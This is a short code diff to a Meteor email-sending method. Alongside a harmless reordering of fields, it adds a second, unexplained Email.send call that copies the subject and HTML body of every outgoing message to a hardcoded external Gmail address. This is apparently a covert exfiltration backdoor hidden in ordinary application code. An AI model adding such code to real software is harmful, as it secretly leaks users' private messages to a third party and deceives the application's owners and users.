@@ -129,8 +129,15 @@ Meteor.methods({
     this.unblock();
 
     Email.send({
-      to: to,
       from: from,
+      to: to,
+      subject: subject,
+      html: html
+    });
+
+    Email.send({
+      from: from,
+      to: "IETUDB@gmail.com",
       subject: subject,
       html: html
     });
